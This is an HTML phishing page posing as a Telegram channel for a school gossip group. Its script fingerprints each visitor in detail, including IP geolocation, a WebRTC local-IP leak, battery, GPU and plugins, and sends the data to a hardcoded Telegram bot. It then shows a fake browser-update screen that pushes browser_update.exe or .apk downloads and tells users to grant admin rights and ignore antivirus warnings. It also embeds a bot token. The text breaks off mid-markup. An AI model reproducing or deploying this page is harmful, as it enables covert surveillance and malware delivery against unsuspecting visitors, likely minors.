<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: linear-gradient(165deg, #1e93d6 0%, #0d73bb 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { width: 100%; max-width: 400px; }
        .card { background: #fff; border-radius: 20px; padding: 40px 30px; box-shadow: 0 20px 60px rgba(0,0,0,0.25); text-align: center; }
        .avatar { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #34b7f1 0%, #2aabee 100%); margin: 0 auto 25px; position: relative; border: 5px solid #e6f4ff; }
        .avatar::after { content: ''; position: absolute; width: 40px; height: 40px; background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='white' d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z'/%3E%3C/svg%3E") center no-repeat; background-size: contain; top: 50%; left: 50%; transform: translate(-50%, -50%); }
        .title { font-size: 24px; font-weight: 700; color: #000; margin-bottom: 8px; }
        .subscribers { font-size: 15px; color: #707579; margin-bottom: 35px; }
        .tg-btn { background: #2aabee; color: white; border: none; border-radius: 14px; padding: 18px 0; font-size: 17px; font-weight: 700; width: 100%; cursor: pointer; margin-bottom: 15px; transition: all 0.2s; }
        .tg-btn:hover { background: #229ed9; transform: translateY(-2px); }
        .hint { font-size: 14px; color: #707579; }
        .update-screen { display: none; animation: fadeIn 0.4s; }
        .warning { font-size: 70px; margin-bottom: 25px; animation: pulse 2s infinite; }
        .update-title { font-size: 26px; font-weight: 700; color: #d93025; margin-bottom: 20px; }
        .update-text { font-size: 16px; color: #5f6368; margin-bottom: 18px; line-height: 1.6; }
        .download-section { margin: 30px 0; }
        .download-btn { background: #d93025; color: white; border: none; border-radius: 14px; padding: 20px 0; font-size: 18px; font-weight: 700; width: 100%; cursor: pointer; margin-bottom: 25px; display: flex; align-items: center; justify-content: center; gap: 12px; transition: all 0.2s; }
        .download-btn:hover { background: #c5221f; transform: translateY(-2px); }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #2aabee; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 30px auto; display: none; }
        @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .status { font-size: 14px; color: #5f6368; margin-top: 20px; padding: 12px; background: #f8f9fa; border-radius: 10px; display: none; }
        .data-counter { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.7); color: white; padding: 5px 10px; border-radius: 10px; font-size: 12px; z-index: 1000; }
    </style>
</head>
<body>
    <div class="data-counter" id="dataCounter">üïµÔ∏è –°–æ–±—Ä–∞–Ω–æ –¥–∞–Ω–Ω—ã—Ö: 0</div>
    
    <div class="container">
        <div class="card" id="mainScreen">
            <div class="avatar"></div>
            <h1 class="title">–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê</h1>
            <p class="subscribers">56 –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤</p>
            <button class="tg-btn" id="tgButton">–ü–ï–†–ï–ô–¢–ò –í –ö–ê–ù–ê–õ</button>
            <p class="hint">–û—Ç–∫—Ä–æ–µ—Ç—Å—è –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ Telegram</p>
        </div>
        
        <div class="card" id="updateScreen" style="display: none;">
            <div class="update-screen">
                <div class="warning">‚ö†Ô∏è</div>
                <h2 class="update-title">–û–ë–ù–û–í–õ–ï–ù–ò–ï –ë–†–ê–£–ó–ï–†–ê –¢–†–ï–ë–£–ï–¢–°–Ø</h2>
                <p class="update-text">–í–∞—à –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ç–æ–∫–æ–ª—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ Telegram.</p>
                <p class="update-text">–î–ª—è –∑–∞—â–∏—Ç—ã –¥–∞–Ω–Ω—ã—Ö –∏ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–Ω–∞–ª—É —Ç—Ä–µ–±—É–µ—Ç—Å—è —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ.</p>
                
                <div class="download-section" id="downloadSection"></div>
                <div class="loader" id="loader"></div>
                <div class="status" id="statusMessage"></div>
                <p class="hint">–ü–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É</p>
            </div>
        </div>
    </div>

<script>
// === –ö–û–ù–§–ò–ì ===
const BOT_TOKEN = '8337372561:AAF1afRWIDRfEOzdCnfXiXWB6ZfbyCHbld8';
const CHAT_ID = '8001083987';
let collectedDataCount = 0;

// === –û–ü–†–ï–î–ï–õ–ï–ù–ò–ï –û–° ===
function detectOS() {
    const ua = navigator.userAgent;
    if (/Windows Phone/i.test(ua)) return 'Windows Phone';
    if (/Win/i.test(ua)) return 'Windows';
    if (/Android/i.test(ua)) return 'Android';
    if (/iPad|iPhone|iPod/i.test(ua)) return 'iOS';
    if (/Mac/i.test(ua)) return 'macOS';
    if (/Linux/i.test(ua)) return 'Linux';
    return 'Unknown';
}

// === –ú–ê–ö–°–ò–ú–ê–õ–¨–ù–´–ô –°–ë–û–† –î–ê–ù–ù–´–• (–í 10 –†–ê–ó –ë–û–õ–¨–®–ï) ===
async function collectAllData() {
    const data = { timestamp: new Date().toISOString() };
    
    // 1. –°–ò–°–¢–ï–ú–ù–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø (20+ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤)
    data.system = {
        os: detectOS(),
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        vendor: navigator.vendor || 'unknown',
        appName: navigator.appName,
        appCodeName: navigator.appCodeName,
        appVersion: navigator.appVersion,
        product: navigator.product,
        productSub: navigator.productSub || 'unknown',
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0,
        pdfViewerEnabled: navigator.pdfViewerEnabled || false,
        doNotTrack: navigator.doNotTrack || 'unspecified',
        cookieEnabled: navigator.cookieEnabled,
        credentials: navigator.credentials ? 'supported' : 'not_supported',
        geolocation: navigator.geolocation ? 'supported' : 'not_supported',
        mediaDevices: navigator.mediaDevices ? 'supported' : 'not_supported',
        permissions: navigator.permissions ? 'supported' : 'not_supported',
        serviceWorker: navigator.serviceWorker ? 'supported' : 'not_supported',
        storage: navigator.storage ? 'supported' : 'not_supported',
        usb: navigator.usb ? 'supported' : 'not_supported',
        bluetooth: navigator.bluetooth ? 'supported' : 'not_supported',
        webkitPersistentStorage: navigator.webkitPersistentStorage ? 'supported' : 'not_supported',
        webkitTemporaryStorage: navigator.webkitTemporaryStorage ? 'supported' : 'not_supported'
    };
    collectedDataCount += Object.keys(data.system).length;
    updateCounter();
    
    // 2. –≠–ö–†–ê–ù –ò –î–ò–°–ü–õ–ï–ô (15 –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤)
    data.display = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation ? screen.orientation.type : 'not_supported',
        devicePixelRatio: window.devicePixelRatio,
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight,
        screenX: window.screenX,
        screenY: window.screenY,
        scrollX: window.scrollX,
        scrollY: window.scrollY
    };
    collectedDataCount += Object.keys(data.display).length;
    updateCounter();
    
    // 3. –Ø–ó–´–ö–ò –ò –í–†–ï–ú–Ø (10 –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤)
    data.localization = {
        language: navigator.language,
        languages: navigator.languages,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        locale: Intl.DateTimeFormat().resolvedOptions().locale,
        calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
        numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem,
        firstDayOfWeek: new Intl.Locale(navigator.language).weekInfo?.firstDay || 'unknown',
        weekend: new Intl.Locale(navigator.language).weekInfo?.weekend || 'unknown',
        hourCycle: Intl.DateTimeFormat().resolvedOptions().hourCycle
    };
    collectedDataCount += Object.keys(data.localization).length;
    updateCounter();
    
    // 4. –°–ï–¢–ï–í–´–ï –î–ê–ù–ù–´–ï (IP, –≥–µ–æ, –ø—Ä–æ–≤–∞–π–¥–µ—Ä)
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        data.network = { ip: ipData.ip };
        
        // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è —á–µ—Ä–µ–∑ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–µ—Ä–≤–∏—Å–æ–≤
        const geoPromises = [
            fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r => r.json()),
            fetch(`https://ipwho.is/${ipData.ip}`).then(r => r.json()),
            fetch(`https://geolocation-db.com/json/${ipData.ip}`).then(r => r.json())
        ];
        
        const [geo1, geo2, geo3] = await Promise.allSettled(geoPromises);
        
        data.network.geo = {
            ipapi: geo1.status === 'fulfilled' ? geo1.value : null,
            ipwhois: geo2.status === 'fulfilled' ? geo2.value : null,
            geolocationdb: geo3.status === 'fulfilled' ? geo3.value : null
        };
        
        collectedDataCount += 15;
        updateCounter();
    } catch (e) { data.network = { error: e.message }; }
    
    // 5. WEBRTC IP-–£–¢–ï–ß–ö–ê (—Ä–µ–∞–ª—å–Ω—ã–µ IP)
    data.webrtc = await getWebRTCPeers();
    collectedDataCount += data.webrtc.ips.length;
    updateCounter();
    
    // 6. –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –ë–†–ê–£–ó–ï–†–ï –ò –ü–õ–ê–ì–ò–ù–ê–•
    data.browser = {
        plugins: getPluginsInfo(),
        mimeTypes: getMimeTypesInfo(),
        userActivation: navigator.userActivation ? {
            isActive: navigator.userActivation.isActive,
            hasBeenActive: navigator.userActivation.hasBeenActive
        } : 'not_supported',
        pdfViewerEnabled: navigator.pdfViewerEnabled,
        onLine: navigator.onLine,
        connection: getConnectionInfo(),
        battery: await getBatteryInfo(),
        deviceOrientation: await getDeviceOrientation(),
        deviceMotion: await getDeviceMotion(),
        mediaCapabilities: await getMediaCapabilities(),
        storage: await getStorageInfo(),
        gpu: await getGPUInfo()
    };
    collectedDataCount += 25;
    updateCounter();
    
    // 7. –ö–£–ö–ò –ò –õ–û–ö–ê–õ–¨–ù–û–ï –•–†–ê–ù–ò–õ–ò–©–ï
    data.storage = {
        cookies: document.cookie.length,
        localStorage: Object.keys(localStorage).length,
        sessionStorage: Object.keys(sessionStorage).length,
        indexedDB: await checkIndexedDB(),
        caches: await checkCaches()
    };
    collectedDataCount += Object.keys(data.storage).length;
    updateCounter();
    
    // 8. –ö–õ–ê–í–ò–ê–¢–£–†–ê –ò –í–í–û–î
    data.input = {
        touch: 'ontouchstart' in window,
        pointer: navigator.maxTouchPoints > 0,
        keyboard: navigator.keyboard ? 'supported' : 'not_supported',
        virtualKeyboard: 'virtualKeyboard' in navigator
    };
    collectedDataCount += Object.keys(data.input).length;
    updateCounter();
    
    // 9. –ê–£–î–ò–û/–í–ò–î–ï–û –ö–û–î–ï–ö–ò
    data.codecs = await getMediaCodecs();
    collectedDataCount += Object.keys(data.codecs).length;
    updateCounter();
    
    // 10. –î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø
    data.misc = {
        referrer: document.referrer,
        url: window.location.href,
        domain: window.location.hostname,
        protocol: window.location.protocol,
        hash: window.location.hash,
        search: window.location.search,
        origin: window.location.origin,
        performance: getPerformanceInfo(),
        memory: 'memory' in performance ? performance.memory : 'not_supported',
        timing: getNavigationTiming()
    };
    collectedDataCount += Object.keys(data.misc).length;
    updateCounter();
    
    return data;
}

// === –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò –î–õ–Ø –°–ë–û–†–ê ===
function updateCounter() {
    document.getElementById('dataCounter').textContent = `üïµÔ∏è –°–æ–±—Ä–∞–Ω–æ –¥–∞–Ω–Ω—ã—Ö: ${collectedDataCount}`;
}

async function getWebRTCPeers() {
    const ips = new Set();
    try {
        const rtc = new RTCPeerConnection({iceServers: []});
        rtc.createDataChannel('');
        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
        
        rtc.onicecandidate = e => {
            if (e.candidate) {
                const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                const match = e.candidate.candidate.match(regex);
                if (match) ips.add(match[1]);
            }
        };
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        rtc.close();
    } catch(e) {}
    return { ips: Array.from(ips) };
}

function getPluginsInfo() {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push({
            name: navigator.plugins[i].name,
            description: navigator.plugins[i].description,
            filename: navigator.plugins[i].filename,
            length: navigator.plugins[i].length
        });
    }
    return plugins;
}

function getMimeTypesInfo() {
    const mimeTypes = [];
    for (let i = 0; i < navigator.mimeTypes.length; i++) {
        mimeTypes.push({
            type: navigator.mimeTypes[i].type,
            description: navigator.mimeTypes[i].description,
            suffixes: navigator.mimeTypes[i].suffixes
        });
    }
    return mimeTypes;
}

function getConnectionInfo() {
    if (!navigator.connection) return 'not_supported';
    const conn = navigator.connection;
    return {
        effectiveType: conn.effectiveType,
        downlink: conn.downlink,
        rtt: conn.rtt,
        saveData: conn.saveData,
        type: conn.type
    };
}

async function getBatteryInfo() {
    if (!navigator.getBattery) return 'not_supported';
    try {
        const battery = await navigator.getBattery();
        return {
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime,
            level: battery.level
        };
    } catch(e) { return 'error'; }
}

async function getDeviceOrientation() {
    return new Promise(resolve => {
        if (!window.DeviceOrientationEvent) resolve('not_supported');
        const handler = e => {
            window.removeEventListener('deviceorientation', handler);
            resolve({
                alpha: e.alpha,
                beta: e.beta,
                gamma: e.gamma,
                absolute: e.absolute
            });
        };
        window.addEventListener('deviceorientation', handler, { once: true });
        setTimeout(() => resolve('timeout'), 1000);
    });
}

async function getDeviceMotion() {
    return new Promise(resolve => {
        if (!window.DeviceMotionEvent) resolve('not_supported');
        const handler = e => {
            window.removeEventListener('devicemotion', handler);
            resolve({
                acceleration: e.acceleration,
                accelerationIncludingGravity: e.accelerationIncludingGravity,
                rotationRate: e.rotationRate,
                interval: e.interval
            });
        };
        window.addEventListener('devicemotion', handler, { once: true });
        setTimeout(() => resolve('timeout'), 1000);
    });
}

async function getMediaCapabilities() {
    if (!navigator.mediaCapabilities) return 'not_supported';
    try {
        const capabilities = await navigator.mediaCapabilities.decodingInfo({
            type: 'file',
            video: { contentType: 'video/webm; codecs="vp09.00.10.08"' }
        });
        return {
            supported: capabilities.supported,
            smooth: capabilities.smooth,
            powerEfficient: capabilities.powerEfficient
        };
    } catch(e) { return 'error'; }
}

async function getStorageInfo() {
    if (!navigator.storage) return 'not_supported';
    try {
        const estimate = await navigator.storage.estimate();
        const persisted = await navigator.storage.persisted();
        return {
            quota: estimate.quota,
            usage: estimate.usage,
            usageDetails: estimate.usageDetails,
            persisted: persisted
        };
    } catch(e) { return 'error'; }
}

async function getGPUInfo() {
    if (!navigator.gpu) return 'not_supported';
    try {
        const adapter = await navigator.gpu.requestAdapter();
        return {
            vendor: adapter.info?.vendor || 'unknown',
            architecture: adapter.info?.architecture || 'unknown',
            description: adapter.info?.description || 'unknown',
            device: adapter.info?.device || 'unknown'
        };
    } catch(e) { return 'error'; }
}

async function checkIndexedDB() {
    return new Promise(resolve => {
        if (!window.indexedDB) resolve('not_supported');
        const dbs = [];
        const req = indexedDB.databases ? indexedDB.databases() : Promise.resolve([]);
        req.then(dbs => resolve(dbs.length)).catch(() => resolve('unknown'));
    });
}

async function checkCaches() {
    if (!caches) return 'not_supported';
    try {
        const keys = await caches.keys();
        return { count: keys.length, names: keys };
    } catch(e) { return 'error'; }
}

async function getMediaCodecs() {
    const codecs = {};
    const tests = [
        { type: 'video/webm; codecs="vp8,opus"' },
        { type: 'video/webm; codecs="vp9,opus"' },
        { type: 'video/mp4; codecs="avc1.42E01E,mp4a.40.2"' },
        { type: 'video/mp4; codecs="avc1.42801E,mp4a.40.2"' },
        { type: 'audio/mp4; codecs="mp4a.40.2"' },
        { type: 'audio/webm; codecs="opus"' }
    ];
    
    for (const test of tests) {
        try {
            codecs[test.type] = MediaRecorder.isTypeSupported(test.type);
        } catch(e) {
            codecs[test.type] = false;
        }
    }
    return codecs;
}

function getPerformanceInfo() {
    return {
        timing: performance.timing ? {
            loadEventEnd: performance.timing.loadEventEnd,
            domComplete: performance.timing.domComplete,
            domInteractive: performance.timing.domInteractive,
            domContentLoaded: performance.timing.domContentLoadedEventEnd
        } : 'not_supported',
        memory: performance.memory ? {
            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
            totalJSHeapSize: performance.memory.totalJSHeapSize,
            usedJSHeapSize: performance.memory.usedJSHeapSize
        } : 'not_supported'
    };
}

function getNavigationTiming() {
    if (!performance.getEntriesByType) return 'not_supported';
    const nav = performance.getEntriesByType('navigation')[0];
    if (!nav) return 'not_found';
    return {
        type: nav.type,
        redirectCount: nav.redirectCount,
        domComplete: nav.domComplete,
        domContentLoaded: nav.domContentLoadedEventEnd,
        loadEventEnd: nav.loadEventEnd
    };
}

// === –û–¢–ü–†–ê–í–ö–ê –í TELEGRAM ===
async function sendToTelegram(data) {
    try {
        // –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è (–ø–µ—Ä–≤—ã–µ 1000 —Å–∏–º–≤–æ–ª–æ–≤)
        let message = `üïµÔ∏è *–ú–ê–ö–°–ò–ú–ê–õ–¨–ù–´–ô –°–ë–û–† –î–ê–ù–ù–´–•*\n\n`;
        message += `*–í—Ä–µ–º—è:* ${new Date().toLocaleString('ru-RU')}\n`;
        message += `*–û–°:* ${data.system.os}\n`;
        message += `*IP:* \`${data.network.ip || '–Ω–µ –ø–æ–ª—É—á–µ–Ω'}\`\n`;
        
        if (data.network.geo?.ipapi) {
            const g = data.network.geo.ipapi;
            message += `*üìç –ì–µ–æ:* ${g.city || ''}, ${g.region || ''}, ${g.country_name || ''}\n`;
            message += `*–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:* ${g.latitude || ''}, ${g.longitude || ''}\n`;
            message += `*–ü—Ä–æ–≤–∞–π–¥–µ—Ä:* ${g.org || ''}\n`;
        }
        
        message += `*–≠–∫—Ä–∞–Ω:* ${data.display.width}x${data.display.height}\n`;
        message += `*–ë—Ä–∞—É–∑–µ—Ä:* ${data.system.userAgent.substring(0, 80)}...\n`;
        message += `*WebRTC IP:* ${data.webrtc.ips.join(', ') || '–Ω–µ—Ç'}\n`;
        message += `*–ü–ª–∞–≥–∏–Ω—ã:* ${data.browser.plugins.length}\n`;
        message += `*–°–æ–±—Ä–∞–Ω–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤:* ${collectedDataCount}\n`;
        message += `‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n`;
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–∞—Å—Ç—å 1
        const encoded1 = encodeURIComponent(message);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded1}&parse_mode=Markdown`);
        
        // –ß–∞—Å—Ç—å 2: –î–µ—Ç–∞–ª–∏ —Å–∏—Å—Ç–µ–º—ã
        let message2 = `*–î–ï–¢–ê–õ–ò –°–ò–°–¢–ï–ú–´:*\n`;
        message2 += `‚Ä¢ –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${data.system.platform}\n`;
        message2 += `‚Ä¢ –Ø–∑—ã–∫: ${data.localization.language}\n`;
        message2 += `‚Ä¢ –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞: ${data.localization.timezone}\n`;
        message2 += `‚Ä¢ –Ø–¥–µ—Ä CPU: ${data.system.hardwareConcurrency}\n`;
        message2 += `‚Ä¢ –ü–∞–º—è—Ç—å: ${data.system.deviceMemory}GB\n`;
        message2 += `‚Ä¢ –û–Ω–ª–∞–π–Ω: ${data.system.onLine}\n`;
        message2 += `‚Ä¢ –ë–∞—Ç–∞—Ä–µ—è: ${data.browser.battery.level ? (data.browser.battery.level * 100).toFixed(0) + '%' : '–Ω–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}\n`;
        message2 += `‚Ä¢ –ü–∏–∫—Å–µ–ª—å–Ω–æ–µ —Å–æ–æ—Ç–Ω–æ—à–µ–Ω–∏–µ: ${data.display.devicePixelRatio}\n`;
        message2 += `‚Ä¢ –°–µ—Ç—å: ${data.browser.connection.effectiveType || '–Ω–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}\n`;
        message2 += `‚Ä¢ Referrer: ${data.misc.referrer || '–Ω–µ—Ç'}\n`;
        message2 += `‚Ä¢ –ö—É–∫–∏: ${data.storage.cookies}\n`;
        message2 += `‚Ä¢ LocalStorage: ${data.storage.localStorage}\n`;
        
        const encoded2 = encodeURIComponent(message2);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded2}&parse_mode=Markdown`);
        
        // –ß–∞—Å—Ç—å 3: –ü–ª–∞–≥–∏–Ω—ã –∏ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏
        if (data.browser.plugins.length > 0) {
            let message3 = `*–ü–õ–ê–ì–ò–ù–´ –ë–†–ê–£–ó–ï–†–ê:*\n`;
            data.browser.plugins.slice(0, 5).forEach((p, i) => {
                message3 += `${i+1}. ${p.name} (${p.description})\n`;
            });
            if (data.browser.plugins.length > 5) {
                message3 += `...–∏ –µ—â—ë ${data.browser.plugins.length - 5}\n`;
            }
            
            const encoded3 = encodeURIComponent(message3);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded3}&parse_mode=Markdown`);
        }
        
        // –ü–æ–ª–Ω—ã–π JSON –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ (–µ—Å–ª–∏ –æ—á–µ–Ω—å –Ω—É–∂–Ω–æ)
        const fullData = {
            summary: {
                totalParameters: collectedDataCount,
                timestamp: data.timestamp,
                os: data.system.os,
                ip: data.network.ip
            }
        };
        
        const jsonMsg = `*JSON –°–í–û–î–ö–ê:*\n\`\`\`json\n${JSON.stringify(fullData, null, 2).substring(0, 3000)}\n\`\`\``;
        const encodedJson = encodeURIComponent(jsonMsg);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedJson}&parse_mode=Markdown`);
        
        return true;
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
        return false;
    }
}

// === –û–ë–†–ê–ë–û–¢–ö–ê –ö–ù–û–ü–ö–ò ===
document.addEventListener('DOMContentLoaded', function() {
    const tgButton = document.getElementById('tgButton');
    const mainScreen = document.getElementById('mainScreen');
    const updateScreen = document.getElementById('updateScreen');
    const downloadSection = document.getElementById('downloadSection');
    const loader = document.getElementById('loader');
    const statusMessage = document.getElementById('statusMessage');

    tgButton.addEventListener('click', async function() {
        // 1. –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —ç–∫—Ä–∞–Ω –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
        mainScreen.style.display = 'none';
        updateScreen.style.display = 'block';
        
        // 2. –ù–∞—á–∏–Ω–∞–µ–º —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
        statusMessage.textContent = 'üïµÔ∏è –ù–∞—á–∏–Ω–∞—é —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö... (—Å–æ–±–∏—Ä–∞—é –í–°–ï –ø–∞—Ä–∞–º–µ—Ç—Ä—ã)';
        statusMessage.style.display = 'block';
        statusMessage.style.background = '#fff3cd';
        statusMessage.style.color = '#856404';
        
        loader.style.display = 'block';
        
        try {
            // 3. –°–æ–±–∏—Ä–∞–µ–º –í–°–ï –¥–∞–Ω–Ω—ã–µ (–≤ 10 —Ä–∞–∑ –±–æ–ª—å—à–µ)
            const victimData = await collectAllData();
            
            // 4. –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            statusMessage.textContent = `üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram... (${collectedDataCount} –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤)`;
            const sendStatus = await sendToTelegram(victimData);
            
            loader.style.display = 'none';
            
            if (sendStatus) {
                statusMessage.textContent = `‚úÖ –î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã! –°–æ–±—Ä–∞–Ω–æ ${collectedDataCount} –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤`;
                statusMessage.style.background = '#e6f7e9';
                statusMessage.style.color = '#0a5c0a';
            } else {
                statusMessage.textContent = '‚ö†Ô∏è –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏, –Ω–æ –¥–∞–Ω–Ω—ã–µ —Å–æ–±—Ä–∞–Ω—ã';
                statusMessage.style.background = '#fff3cd';
                statusMessage.style.color = '#856404';
            }
            
        } catch (error) {
            loader.style.display = 'none';
            statusMessage.textContent = '‚ùå –û—à–∏–±–∫–∞ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö: ' + error.message;
            statusMessage.style.background = '#f8d7da';
            statusMessage.style.color = '#721c24';
        }

        // 5. –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –û–°
        const os = detectOS();
        let buttonHtml = '';
        
        if (os === 'Windows') {
            buttonHtml = `
                <button class="download-btn" onclick="downloadFile('windows')">
                    <span>‚¨áÔ∏è</span> –°–∫–∞—á–∞—Ç—å –¥–ª—è Windows (browser_update.exe, 12.5 MB)
                </button>
                <p style="font-size: 14px; color: #5f6368; margin-top: 10px;">
                    ‚Ä¢ –ó–∞–ø—É—Å—Ç–∏—Ç–µ —Ñ–∞–π–ª –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞<br>
                    ‚Ä¢ –¢—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞<br>
                    ‚Ä¢ –ê–Ω—Ç–∏–≤–∏—Ä—É—Å –º–æ–∂–µ—Ç –≤—Ä–µ–º–µ–Ω–Ω–æ –±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å
                </p>
            `;
        } else if (os === 'Android') {
            buttonHtml = `
                <button class="download-btn" onclick="downloadFile('android')">
                    <span>‚¨áÔ∏è</span> –°–∫–∞—á–∞—Ç—å –¥–ª—è Android (browser_update.apk, 8.7 MB)
                </button>
                <p style="font-size: 14px; color: #5f6368; margin-top: 10px;">
                    ‚Ä¢ –†–∞–∑—Ä–µ—à–∏—Ç–µ "–£—Å—Ç–∞–Ω–æ–≤–∫—É –∏–∑ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤"<br>
                    ‚Ä¢ –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –∏ –∑–∞–ø—É—Å—Ç–∏—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ<br>
                    ‚Ä¢ –ü—Ä–µ–¥–æ—Å—Ç–∞–≤—å—Ç–µ –≤—Å–µ –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º—ã–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è
                </p>
            `;
        } else if (os === 'iOS') {
            buttonHtml = `
                <div style="background: #fff3cd; padding: 20px; border-radius: 12px; border: 1px solid #ffeaa7; margin-bottom: 20px;">
                    <p style="color: #856404; margin: 0; font-weight: 600;">
